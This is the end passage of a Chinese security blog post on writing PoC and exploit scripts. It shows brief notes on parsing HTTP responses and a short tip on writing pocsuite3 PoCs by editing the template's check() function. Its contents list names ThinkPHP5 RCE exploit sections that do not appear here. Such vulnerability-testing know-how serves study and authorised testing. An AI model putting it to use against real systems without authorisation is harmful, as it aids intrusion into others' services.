+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">①字典取值</span><br><span class="line">字典名.get（）   或者   字典名【】</span><br><span class="line">get取字典取值，假如值不存在不会报错   ，【】取会报错</span><br><span class="line"></span><br><span class="line">②json取值</span><br><span class="line">response.json()</span><br><span class="line">③字符串取值</span><br><span class="line">④切割取值</span><br><span class="line">⑤xml取值</span><br><span class="line">正则取值   ，分割取值  ，xml解析</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="7-编写pocsuit3框架poc思路"><a href="#7-编写pocsuit3框架poc思路" class="headerlink" title="7.编写pocsuit3框架poc思路"></a>7.编写pocsuit3框架poc思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">按着demo模板 只需修改def check()里的内容</span><br><span class="line">实现 多线程，读取文件，导入wen&#x27;jian</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://pontusec.github.io">pontus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://pontusec.github.io/2023/04/02/poc&amp;exp%E7%BC%96%E5%86%99/">https://pontusec.github.io/2023/04/02/poc&amp;exp%E7%BC%96%E5%86%99/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://pontusec.github.io" target="_blank">pontus `Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/02/pocsuite3%E6%A1%86%E6%9E%B6%E5%88%9D%E4%BD%93%E9%AA%8C/" title="pocsuit3初体验"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">pocsuit3初体验</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/02/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BC%96%E7%A8%8B/" title="命令行编程"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">命令行编程</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">pontus</div><div class="author-info__description">博客</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" href="https://pontusec.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-poc%E5%92%8Cexp%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.</span> <span class="toc-text">1.poc和exp的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%BC%96%E5%86%99thinkphp5-rce%E7%9A%84poc"><span class="toc-number">2.</span> <span class="toc-text">2.编写thinkphp5 rce的poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%BC%96%E5%86%99thinkphp5-rce%E7%9A%84exp"><span class="toc-number">3.</span> <span class="toc-text">3.编写thinkphp5 rce的exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%BC%96%E5%86%99%E4%BB%A5%E4%B8%8B%E6%BC%8F%E6%B4%9Eexp"><span class="toc-number">4.</span> <span class="toc-text">4.编写以下漏洞exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E7%BC%96%E5%86%99%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC"><span class="toc-number">5.</span> <span class="toc-text">5.编写弱口令检测脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E7%BC%96%E5%86%99%E4%B8%AA%E4%BA%BApoc%E6%B5%81%E7%A8%8B%E6%80%9D%E8%B7%AF"><span class="toc-number">6.</span> <span class="toc-text">6.编写个人poc流程思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E7%BC%96%E5%86%99pocsuit3%E6%A1%86%E6%9E%B6poc%E6%80%9D%E8%B7%AF"><span class="toc-number">7.</span> <span class="toc-text">7.编写pocsuit3框架poc思路</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/02/nc%E7%BC%96%E5%86%99/" title="nc编写">nc编写</a><time datetime="2023-04-02T09:19:23.204Z" title="发表于 2023-04-02 17:19:23">2023-04-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/02/socket%E7%BC%96%E7%A8%8B/" title="socket编程">socket编程</a><time datetime="2023-04-02T09:19:23.201Z" title="发表于 2023-04-02 17:19:23">2023-04-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/02/git%E5%88%9D%E4%BD%93%E9%AA%8C/" title="git初体验">git初体验</a><time datetime="2023-04-02T09:19:23.198Z" title="发表于 2023-04-02 17:19:23">2023-04-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/02/pocsuite3%E6%A1%86%E6%9E%B6%E4%BA%8C%E5%BC%80/" title="pocsuit3二开">pocsuit3二开</a><time datetime="2023-04-02T09:19:23.196Z" title="发表于 2023-04-02 17:19:23">2023-04-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/02/pocsuite3%E6%A1%86%E6%9E%B6%E5%88%9D%E4%BD%93%E9%AA%8C/" title="pocsuit3初体验">pocsuit3初体验</a><time datetime="2023-04-02T09:19:23.182Z" title="发表于 2023-04-02 17:19:23">2023-04-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By pontus</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInRight');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
